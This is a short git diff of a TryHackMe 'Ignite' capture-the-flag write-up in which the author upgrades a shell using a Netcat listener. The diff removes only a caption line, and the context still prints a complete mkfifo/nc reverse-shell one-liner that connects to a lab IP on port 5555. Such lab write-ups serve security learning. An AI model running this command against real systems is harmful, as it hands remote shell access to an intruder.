@@ -53,7 +53,7 @@ Running the customized exploit successfully launched a non-interactive shell on 
 ![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Ignite/Images/Screenshot%205.png)
 
 To upgrade this shell to an interactive one, I opened a Netcat listener on port `5555` and used a reverse shell payload generated from the Reverse Shell Generator website.
-The payload I used:
+
 ```
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.188.239 5555 > /tmp/f
 
